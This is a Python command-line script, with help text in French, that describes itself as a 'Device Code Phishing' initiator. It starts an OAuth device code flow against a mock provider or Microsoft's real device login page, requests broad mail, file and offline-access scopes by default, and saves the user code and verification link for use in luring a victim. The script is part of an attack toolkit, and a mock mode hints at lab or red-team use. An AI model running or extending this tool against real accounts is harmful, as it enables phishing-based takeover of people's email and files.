from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parents[2]
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

from attack.device_code.initiator import DeviceCodeInitiator


def cmd_launch(args: argparse.Namespace) -> int:
    initiator = DeviceCodeInitiator()
    scope = args.scope or "User.Read Mail.Read Files.ReadWrite.All offline_access"
    verification_uri = (
        "http://localhost:9000/device"
        if args.provider == "mock"
        else "https://microsoft.com/devicelogin"
    )
    flow = initiator.initiate(scope=scope, verification_uri=verification_uri)

    data = flow.to_dict()
    data["provider"] = args.provider

    out_path = Path(args.output)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(data, indent=2), encoding="utf-8")

    print(f"✅ Device Code Flow initié (provider={args.provider})")
    print(f"   Output: {out_path}")
    print(f"   user_code       : {flow.user_code}")
    print(f"   verification_uri: {flow.verification_uri}")
    print(f"   expires_at      : {flow.expires_at}")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Device Code Phishing - Initiateur de flow OAuth Device Code",
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    launch_p = subparsers.add_parser(
        "launch", help="Initie un nouveau flow Device Code"
    )
    launch_p.add_argument(
        "--provider",
        "-p",
        type=str,
        required=True,
        choices=["mock", "microsoft", "google"],
        help="Provider cible",
    )
    launch_p.add_argument(
        "--scope",
        "-s",
        type=str,
        default=None,
        help="Scopes OAuth demandés",
    )
    launch_p.add_argument(
        "--output",
        "-o",
        type=str,
        required=True,
        help="Fichier JSON de sortie contenant le flow",
    )

    args = parser.parse_args()
    if args.command == "launch":
        return cmd_launch(args)
    parser.print_help()
    return 1


if __name__ == "__main__":
    sys.exit(main())
